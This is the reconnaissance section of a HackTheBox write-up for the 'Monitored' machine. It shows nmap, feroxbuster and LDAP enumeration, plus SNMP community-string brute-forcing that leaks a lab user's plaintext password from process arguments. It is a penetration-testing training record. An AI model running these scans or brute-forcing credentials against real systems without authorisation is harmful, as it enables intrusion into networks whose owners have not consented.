---
render_with_liquid: false
title: HackTheBox Writeup  Monitored
date: 2024-01-16 13:56 +1400
tags: [hackthebox, nmap, linux, snmp, feroxbuster, onesixtyone, snmp-check, nagios, nagios-xi, nagios-core, sqli, mysql, cve-2023-40931, php, api, sqlmap, nagios-xi-2rce, service-binary-permission, sudo, bash-script, file-read, oscp-like-2023]
---



# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ pt init '10.129.62.97 monitored.htb nagios.monitored.htb'
+-----------+--------+--------------+----------------------+
|  PROFILE  | STATUS |      IP      |        DOMAIN        |
+-----------+--------+--------------+----------------------+
| monitored | on     | 10.129.62.97 | monitored.htb        |
| monitored | on     | 10.129.62.97 | nagios.monitored.htb |
+-----------+--------+--------------+----------------------+
```

## Nmap


### TCP

```bash

# Nmap 7.94SVN scan initiated Sun Jan 14 16:27:36 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,389,443,5667, Monitored
Nmap scan report for Monitored (10.129.61.245)
Host is up, received user-set (0.056s latency).
Scanned at 2024-01-14 16:27:37 CST for 19s

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/xFgJTbVC36GNHaE0GG4n/bWZGaD2aE7lsFUvXVdbINrl0qzBPVCMuOE1HNf0LHi09obr2Upt9VURzpYdrQp/7SX2NDet9pb+UQnB1IgjRSxoIxjsOX756a7nzi71tdcR3I0sALQ4ay5I5GO4TvaVq+o8D01v94B0Qm47LVk7J3mN4wFR17lYcCnm0kwxNBsKsAgZVETxGtPgTP6hbauEk/SKGA5GASdWHvbVhRHgmBz2l7oPrTot5e+4m8A7/5qej2y5PZ9Hq/2yOldrNpS77ID689h2fcOLt4fZMUbxuDzQIqGsFLPhmJn5SUCG9aNrWcjZwSL2LtLUCRt6PbW39UAfGf47XWiSs/qTWwW/yw73S8n5oU5rBqH/peFIpQDh2iSmIhbDq36FPv5a2Qi8HyY6ApTAMFhwQE6MnxpysKLt/xEGSDUBXh+4PwnR0sXkxgnL8QtLXKC2YBY04jGG0DXGXxh3xEZ3vmPV961dcsNd6Up8mmSC43g5gj2ML/E=
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=
|   256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.56
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Nagios XI
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-11T21:46:55
| Not valid after:  2297-08-25T21:46:55
| MD5:   b36a:5560:7a5f:047d:9838:6450:4d67:cfe0
| SHA-1: 6109:3844:8c36:b08b:0ae8:a132:971c:8e89:cfac:2b5b
| -----BEGIN CERTIFICATE-----
| MIID/zCCAuegAwIBAgIUVhOvMcK6dv/Kvzplbf6IxOePX3EwDQYJKoZIhvcNAQEL
| BQAwgY0xCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZEb3JzZXQxFDASBgNVBAcMC0Jv
| dXJuZW1vdXRoMRIwEAYDVQQKDAlNb25pdG9yZWQxHTAbBgNVBAMMFG5hZ2lvcy5t
| b25pdG9yZWQuaHRiMSQwIgYJKoZIhvcNAQkBFhVzdXBwb3J0QG1vbml0b3JlZC5o
| dGIwIBcNMjMxMTExMjE0NjU1WhgPMjI5NzA4MjUyMTQ2NTVaMIGNMQswCQYDVQQG
| EwJVSzEPMA0GA1UECAwGRG9yc2V0MRQwEgYDVQQHDAtCb3VybmVtb3V0aDESMBAG
| A1UECgwJTW9uaXRvcmVkMR0wGwYDVQQDDBRuYWdpb3MubW9uaXRvcmVkLmh0YjEk
| MCIGCSqGSIb3DQEJARYVc3VwcG9ydEBtb25pdG9yZWQuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1qRRCKn9wFGquYFdqh7cp4WSTPnKdAwkycqk
| a3WTY0yOubucGmA3jAVdPuSJ0Vp0HOhkbAdo08JVzpvPX7Lh8mIEDRSX39FDYClP
| vQIAldCuWGkZ3QWukRg9a7dK++KL79Iz+XbIAR/XLT9ANoMi8/1GP2BKHvd7uJq7
| LV0xrjtMD6emwDTKFOk5fXaqOeODgnFJyyXQYZrxQQeSATl7cLc1AbX3/6XBsBH7
| e3xWVRMaRxBTwbJ/mZ3BicIGpxGGZnrckdQ8Zv+LRiwvRl1jpEnEeFjazwYWrcH+
| 6BaOvmh4lFPBi3f/f/z5VboRKP0JB0r6I3NM6Zsh8V/Inh4fxQIDAQABo1MwUTAd
| BgNVHQ4EFgQU6VSiElsGw+kqXUryTaN4Wp+a4VswHwYDVR0jBBgwFoAU6VSiElsG
| w+kqXUryTaN4Wp+a4VswDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
| AQEAdPGDylezaB8d/u2ufsA6hinUXF61RkqcKGFjCO+j3VrrYWdM2wHF83WMQjLF
| 03tSek952fObiU2W3vKfA/lvFRfBbgNhYEL0dMVVM95cI46fNTbignCj2yhScjIz
| W9oeghcR44tkU4sRd4Ot9L/KXef35pUkeFCmQ2Xm74/5aIfrUzMnzvazyi661Q97
| mRGL52qMScpl8BCBZkdmx1SfcVgn6qHHZpy+EJ2yfJtQixOgMz3I+hZYkPFjMsgf
| k9w6Z6wmlalRLv3tuPqv8X3o+fWFSDASlf2uMFh1MIje5S/jp3k+nFhemzcsd/al
| 4c8NpU/6egay1sl2ZrQuO8feYA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped syn-ack ttl 63
Service Info: Hosts: nagios.monitored.htb, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Jan 14 16:27:56 2024 -- 1 IP address (1 host up) scanned in 19.88 seconds
```

### UDP

```bash

# Nmap 7.94SVN scan initiated Tue Jan 16 13:42:01 2024 as: nmap -vv --reason -Pn -T4 -sU -sVC --top-ports 100 -oA ./nmap/top_100_udp monitored.htb
Warning: 10.129.62.97 giving up on port because retransmission cap hit (6).
Increasing send delay for 10.129.62.97 from 100 to 200 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.129.62.97 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.129.62.97 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for monitored.htb (10.129.62.97)
Host is up, received user-set (0.063s latency).
Scanned at 2024-01-16 13:42:01 CST for 324s
Not shown: 63 closed udp ports (port-unreach)
PORT      STATE         SERVICE        REASON              VERSION
17/udp    open|filtered qotd           no-response
68/udp    open|filtered dhcpc          no-response
80/udp    open|filtered http           no-response
88/udp    open|filtered kerberos-sec   no-response
123/udp   open          ntp            udp-response ttl 63 NTP v4 (unsynchronized)
| ntp-info:
|_  receive time stamp: 2024-01-16T05:45:38
135/udp   open|filtered msrpc          no-response
136/udp   open|filtered profile        no-response
161/udp   open          snmp           udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 6f3fa7421af94c6500000000
|   snmpEngineBoots: 35
|_  snmpEngineTime: 9m19s
| snmp-processes:
[...]
|   1374:
|     Name: sudo
|     Path: sudo
|     Params: -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
|   1375:
|     Name: bash
|     Path: /bin/bash
|     Params: -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
|   1472:
[...]
|_  2280:
| snmp-netstat:
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:389          0.0.0.0:0
|   TCP  127.0.0.1:25         0.0.0.0:0
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.1:5432       0.0.0.0:0
|   TCP  127.0.0.1:7878       0.0.0.0:0
|   TCP  127.0.0.1:54986      127.0.1.1:80
|   TCP  127.0.0.1:55002      127.0.1.1:80
|   UDP  0.0.0.0:68           *:*
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:162          *:*
|   UDP  10.129.62.97:123     *:*
|_  UDP  127.0.0.1:123        *:*
|_snmp-win32-software: ERROR: Script execution failed (use -d to debug)
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 183.83 Kb sent, 183.83 Kb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.129.62.97  Netmask: 255.255.0.0
|     MAC address: 00:50:56:b9:e4:77 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 17.87 Mb sent, 8.89 Mb received
| snmp-sysdescr: Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64
|_  System uptime: 9m19.46s (55946 timeticks)
162/udp   open          snmp           udp-response        net-snmp; net-snmp SNMPv3 server
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5a44ab2146ff4c6500000000
|   snmpEngineBoots: 26
|_  snmpEngineTime: 9m19s
443/udp   open|filtered https          no-response
[...]
Service Info: Host: monitored

Host script results:
|_clock-skew: 19s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Jan 16 13:47:25 2024 -- 1 IP address (1 host up) scanned in 323.94 seconds
```

## 80 - HTTP : Nagios XI


### Info

![](/assets/obsidian/ed068428d33f6bfd048ab716357d9857.png)

### Directory

Had to set thread limit to avoid connection being dropped (`--scan-limit` * 20 = 60)

```bash
feroxbuster -k -w /usr/share/dirb/wordlists/common.txt -C 400,404,500 -t 20 -u 'https://nagios.monitored.htb' -o ferox_443_common.txt --scan-limit 2
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ cat ferox_443_common.txt | sort -u | awk '$1!=403'
200      GET    10870l    44283w   287600c https://nagios.monitored.htb/javascript/jquery/jquery
200      GET     1186l     8534w    70367c https://nagios.monitored.htb/nagiosxi/includes/css/base.css
200      GET      118l      617w    37941c https://nagios.monitored.htb/nagiosxi/images/apple-touch-icon-precomposed.png
200      GET      123l      611w     5215c https://nagios.monitored.htb/nagiosxi/terminal
200      GET      132l      618w    32639c https://nagios.monitored.htb/nagiosxi/includes/js/core.js
200      GET      177l      116w    17339c https://nagios.monitored.htb/nagiosxi/images/favicon-32x32.png
200      GET      196l      217w    27444c https://nagios.monitored.htb/nagiosxi/images/nagios_logo_white_transbg.png
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/license
200      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/config/deployment/index.php
200      GET      272l     1974w    16128c https://nagios.monitored.htb/nagiosxi/includes/css/themes/modern.css
200      GET      299l     1662w    19586c https://nagios.monitored.htb/nagiosxi/about/main.php
200      GET        2l     1294w    89500c https://nagios.monitored.htb/nagiosxi/includes/js/jquery/jquery-3.6.0.min.js
200      GET      309l     1404w    18495c https://nagios.monitored.htb/nagiosxi/about/
200      GET      309l     1404w    18504c https://nagios.monitored.htb/nagiosxi/about/index.php
200      GET       40l      234w    14576c https://nagios.monitored.htb/nagiosxi/images/apple-touch-icon.png
200      GET      466l     1996w    26575c https://nagios.monitored.htb/nagiosxi/login.php
200      GET      467l     2000w    26737c https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
200      GET        4l        7w      108c https://nagios.monitored.htb/nagiosxi/backend/index.php
200      GET      502l     4372w    26529c https://nagios.monitored.htb/nagiosxi/includes/phpmailer/LICENSE
200      GET        5l       12w     1073c https://nagios.monitored.htb/nagiosxi/images/favicon.ico
200      GET        6l     1474w   123729c https://nagios.monitored.htb/nagiosxi/includes/css/bootstrap.3.min.css
200      GET       75l      208w     3245c https://nagios.monitored.htb/
200      GET       75l      208w     3245c https://nagios.monitored.htb/index.php
301      GET        9l       28w      333c https://nagios.monitored.htb/nagiosxi => https://nagios.monitored.htb/nagiosxi/
301      GET        9l       28w      335c https://nagios.monitored.htb/javascript => https://nagios.monitored.htb/javascript/
301      GET        9l       28w      336c https://nagios.monitored.htb/nagiosxi/db => https://nagios.monitored.htb/nagiosxi/db/
301      GET        9l       28w      337c https://nagios.monitored.htb/nagiosxi/api => https://nagios.monitored.htb/nagiosxi/api/
301      GET        9l       28w      338c https://nagios.monitored.htb/nagiosxi/help => https://nagios.monitored.htb/nagiosxi/help/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/about => https://nagios.monitored.htb/nagiosxi/about/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/admin => https://nagios.monitored.htb/nagiosxi/admin/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/tools => https://nagios.monitored.htb/nagiosxi/tools/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/views => https://nagios.monitored.htb/nagiosxi/views/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/api/v1 => https://nagios.monitored.htb/nagiosxi/api/v1/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/config => https://nagios.monitored.htb/nagiosxi/config/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/images => https://nagios.monitored.htb/nagiosxi/images/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/mobile => https://nagios.monitored.htb/nagiosxi/mobile/
301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/account => https://nagios.monitored.htb/nagiosxi/account/
301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/backend => https://nagios.monitored.htb/nagiosxi/backend/
301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/reports => https://nagios.monitored.htb/nagiosxi/reports/
301      GET        9l       28w      342c https://nagios.monitored.htb/javascript/jquery => https://nagios.monitored.htb/javascript/jquery/
301      GET        9l       28w      342c https://nagios.monitored.htb/nagiosxi/db/adodb => https://nagios.monitored.htb/nagiosxi/db/adodb/
301      GET        9l       28w      342c https://nagios.monitored.htb/nagiosxi/includes => https://nagios.monitored.htb/nagiosxi/includes/
301      GET        9l       28w      345c https://nagios.monitored.htb/nagiosxi/includes/js => https://nagios.monitored.htb/nagiosxi/includes/js/
301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/api/includes => https://nagios.monitored.htb/nagiosxi/api/includes/
301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/db/adodb/xsl => https://nagios.monitored.htb/nagiosxi/db/adodb/xsl/
301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/includes/css => https://nagios.monitored.htb/nagiosxi/includes/css/
301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/mobile/views => https://nagios.monitored.htb/nagiosxi/mobile/views/
301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/db/adodb/lang => https://nagios.monitored.htb/nagiosxi/db/adodb/lang/
301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/db/adodb/perf => https://nagios.monitored.htb/nagiosxi/db/adodb/perf/
301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/images/locale => https://nagios.monitored.htb/nagiosxi/images/locale/
301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/images/social => https://nagios.monitored.htb/nagiosxi/images/social/
301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/includes/lang => https://nagios.monitored.htb/nagiosxi/includes/lang/
301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/mobile/static => https://nagios.monitored.htb/nagiosxi/mobile/static/
301      GET        9l       28w      348c https://nagios.monitored.htb/nagiosxi/includes/fonts => https://nagios.monitored.htb/nagiosxi/includes/fonts/
301      GET        9l       28w      350c https://nagios.monitored.htb/nagiosxi/backend/includes => https://nagios.monitored.htb/nagiosxi/backend/includes/
301      GET        9l       28w      350c https://nagios.monitored.htb/nagiosxi/db/adodb/contrib => https://nagios.monitored.htb/nagiosxi/db/adodb/contrib/
301      GET        9l       28w      350c https://nagios.monitored.htb/nagiosxi/db/adodb/drivers => https://nagios.monitored.htb/nagiosxi/db/adodb/drivers/
301      GET        9l       28w      350c https://nagios.monitored.htb/nagiosxi/db/adodb/scripts => https://nagios.monitored.htb/nagiosxi/db/adodb/scripts/
301      GET        9l       28w      350c https://nagios.monitored.htb/nagiosxi/db/adodb/session => https://nagios.monitored.htb/nagiosxi/db/adodb/session/
301      GET        9l       28w      350c https://nagios.monitored.htb/nagiosxi/mobile/static/js => https://nagios.monitored.htb/nagiosxi/mobile/static/js/
301      GET        9l       28w      351c https://nagios.monitored.htb/nagiosxi/config/deployment => https://nagios.monitored.htb/nagiosxi/config/deployment/
301      GET        9l       28w      351c https://nagios.monitored.htb/nagiosxi/mobile/static/css => https://nagios.monitored.htb/nagiosxi/mobile/static/css/
301      GET        9l       28w      351c https://nagios.monitored.htb/nagiosxi/mobile/static/img => https://nagios.monitored.htb/nagiosxi/mobile/static/img/
301      GET        9l       28w      352c https://nagios.monitored.htb/nagiosxi/db/adodb/replicate => https://nagios.monitored.htb/nagiosxi/db/adodb/replicate/
301      GET        9l       28w      352c https://nagios.monitored.htb/nagiosxi/includes/js/jquery => https://nagios.monitored.htb/nagiosxi/includes/js/jquery/
301      GET        9l       28w      352c https://nagios.monitored.htb/nagiosxi/includes/js/themes => https://nagios.monitored.htb/nagiosxi/includes/js/themes/
301      GET        9l       28w      352c https://nagios.monitored.htb/nagiosxi/includes/phpmailer => https://nagios.monitored.htb/nagiosxi/includes/phpmailer/
301      GET        9l       28w      352c https://nagios.monitored.htb/nagiosxi/mobile/controllers => https://nagios.monitored.htb/nagiosxi/mobile/controllers/
301      GET        9l       28w      353c https://nagios.monitored.htb/nagiosxi/includes/components => https://nagios.monitored.htb/nagiosxi/includes/components/
301      GET        9l       28w      353c https://nagios.monitored.htb/nagiosxi/includes/css/themes => https://nagios.monitored.htb/nagiosxi/includes/css/themes/
301      GET        9l       28w      353c https://nagios.monitored.htb/nagiosxi/mobile/static/fonts => https://nagios.monitored.htb/nagiosxi/mobile/static/fonts/
301      GET        9l       28w      354c https://nagios.monitored.htb/nagiosxi/includes/lang/locale => https://nagios.monitored.htb/nagiosxi/includes/lang/locale/
301      GET        9l       28w      357c https://nagios.monitored.htb/nagiosxi/includes/components/map => https://nagios.monitored.htb/nagiosxi/includes/components/map/
301      GET        9l       28w      359c https://nagios.monitored.htb/nagiosxi/includes/components/proxy => https://nagios.monitored.htb/nagiosxi/includes/components/proxy/
301      GET        9l       28w      359c https://nagios.monitored.htb/nagiosxi/includes/phpmailer/extras => https://nagios.monitored.htb/nagiosxi/includes/phpmailer/extras/
301      GET        9l       28w      360c https://nagios.monitored.htb/nagiosxi/config/deployment/includes => https://nagios.monitored.htb/nagiosxi/config/deployment/includes/
301      GET        9l       28w      361c https://nagios.monitored.htb/nagiosxi/config/deployment/templates => https://nagios.monitored.htb/nagiosxi/config/deployment/templates/
301      GET        9l       28w      361c https://nagios.monitored.htb/nagiosxi/includes/components/actions => https://nagios.monitored.htb/nagiosxi/includes/components/actions/
301      GET        9l       28w      361c https://nagios.monitored.htb/nagiosxi/includes/components/profile => https://nagios.monitored.htb/nagiosxi/includes/components/profile/
301      GET        9l       28w      363c https://nagios.monitored.htb/nagiosxi/includes/components/favorites => https://nagios.monitored.htb/nagiosxi/includes/components/favorites/
302      GET        0l        0w        0c https://nagios.monitored.htb/nagiosxi/install.php => https://nagios.monitored.htb/nagiosxi/
302      GET        0l        0w        0c https://nagios.monitored.htb/nagiosxi/mobile/index.php => https://nagios.monitored.htb/nagiosxi/mobile/views/login.php
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/account/index.php => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/account/index.php%3f&noauth=1
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/admin/activate.php => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/admin/activate.php%3f&noauth=1
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/admin/index.php => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/admin/index.php%3f&noauth=1
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/config/index.php => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/config/index.php%3f&noauth=1
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/help/index.php => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/help/index.php%3f&noauth=1
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/ => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/index.php => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/reports/index.php => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/reports/index.php%3f&noauth=1
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/tools/index.php => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/tools/index.php%3f&noauth=1
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/views/index.php => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/views/index.php%3f&noauth=1
401      GET       14l       54w      468c https://nagios.monitored.htb/nagios
```

## 389 - ldap

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ sudo nmap -n -sV --script 'ldap* and not brute' -p 389 monitored.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 13:56 CST
Nmap scan report for monitored.htb (10.129.62.97)
Host is up (0.063s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ldap-search:
|   Context: dc=monitored,dc=htb
|     dn: dc=monitored,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: monitored.htb
|_        dc: monitored
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       namingContexts: dc=monitored,dc=htb
|       supportedControl: 2.16.840.1.113730.3.4.18
|       supportedControl: 2.16.840.1.113730.3.4.2
|       supportedControl: 1.3.6.1.4.1.4203.1.10.1
|       supportedControl: 1.3.6.1.1.22
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.826.0.1.3344810.2.3
|       supportedControl: 1.3.6.1.1.13.2
|       supportedControl: 1.3.6.1.1.13.1
|       supportedControl: 1.3.6.1.1.12
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3
|       supportedExtension: 1.3.6.1.1.8
|       supportedLDAPVersion: 3
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedSASLMechanisms: NTLM
|       supportedSASLMechanisms: CRAM-MD5
|_      subschemaSubentry: cn=Subschema

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```


## 161/udp - SNMP

Brute community strings

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ onesixtyone 10.129.61.245 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
Scanning 1 hosts, 3218 communities
10.129.61.245 [public] Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64
10.129.61.245 [public] Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64
```

snmp-check

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ snmp-check -w 10.129.61.245 | tee snmp-check.txt
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.61.245:161 using SNMPv1 and community 'public'
[+] Write access check enabled

[*] Write access not permitted!
[*] System information:

  Host IP address               : 10.129.61.245
  Hostname                      : monitored
  Description                   : Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64
  Contact                       : Me <root@monitored.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 01:53:52.01
  Uptime system                 : 01:53:45.93
  System date                   : 2024-1-14 05:17:05.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 4158371
  TCP segments sent             : 3356673
  TCP segments retrans          : 29781
  Input datagrams               : 4388070
  Delivered datagrams           : 4388065
  Output datagrams              : 3019895

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 65536
  In octets                     : 1323860
  Out octets                    : 1323860

  Interface                     : [ up ] VMware VMXNET3 Ethernet Controller
  Id                            : 2
  Mac Address                   : 00:50:56:b9:87:b1
  Type                          : ethernet-csmacd
  Speed                         : 4294 Mbps
  MTU                           : 1500
  In octets                     : 472840221
  Out octets                    : 1014789997


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast
  2                     10.129.61.245         255.255.0.0           1
  1                     127.0.0.1             255.0.0.0             0

[*] Routing information:

  Destination           Next hop              Mask                  Metric
  0.0.0.0               10.129.0.1            0.0.0.0               1
  10.129.0.0            0.0.0.0               255.255.0.0           0
  169.254.0.0           0.0.0.0               255.255.0.0           0

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State
  0.0.0.0               22                    0.0.0.0               0                     listen
  0.0.0.0               389                   0.0.0.0               0                     listen
  127.0.0.1             25                    0.0.0.0               0                     listen
  127.0.0.1             3306                  0.0.0.0               0                     listen
  127.0.0.1             5432                  0.0.0.0               0                     listen
  127.0.0.1             7878                  0.0.0.0               0                     listen
  127.0.0.1             52874                 127.0.1.1             80                    timeWait
  127.0.0.1             52882                 127.0.1.1             80                    timeWait

[*] Listening UDP ports:

  Local address         Local port
  0.0.0.0               68
  0.0.0.0               123
  0.0.0.0               161
  0.0.0.0               162
  10.129.61.245         123
  127.0.0.1             123

[*] Processes:

  Id                    Status                Name                  Path                  Parameters
  1                     runnable              systemd               /sbin/init
  2                     runnable              kthreadd
[...]
  412                   runnable              card0-crtc7
  419                   runnable              VGAuthService         /usr/bin/VGAuthService
  420                   runnable              vmtoolsd              /usr/bin/vmtoolsd
  438                   runnable              auditd                /sbin/auditd
  448                   runnable              laurel                /usr/local/sbin/laurel  --config /etc/laurel/config.toml
  508                   runnable              audit_prune_tre
  529                   runnable              cron                  /usr/sbin/cron        -f
  530                   runnable              dbus-daemon           /usr/bin/dbus-daemon  --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  538                   runnable              cron                  /usr/sbin/CRON        -f
  541                   runnable              hwmon1
  545                   runnable              rsyslogd              /usr/sbin/rsyslogd    -n -iNONE
  546                   runnable              systemd-logind        /lib/systemd/systemd-logind
  547                   runnable              wpa_supplicant        /sbin/wpa_supplicant  -u -s -O /run/wpa_supplicant
  549                   runnable              sh                    /bin/sh               -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
  650                   runnable              dhclient              /sbin/dhclient        -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
  741                   runnable              npcd                  /usr/local/nagios/bin/npcd  -f /usr/local/nagios/etc/pnp/npcd.cfg
  751                   runnable              snmptrapd             /usr/sbin/snmptrapd   -LOw -f -p /run/snmptrapd.pid
  766                   runnable              ntpd                  /usr/sbin/ntpd        -p /var/run/ntpd.pid -g -u 108:116
  770                   running               snmpd                 /usr/sbin/snmpd       -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
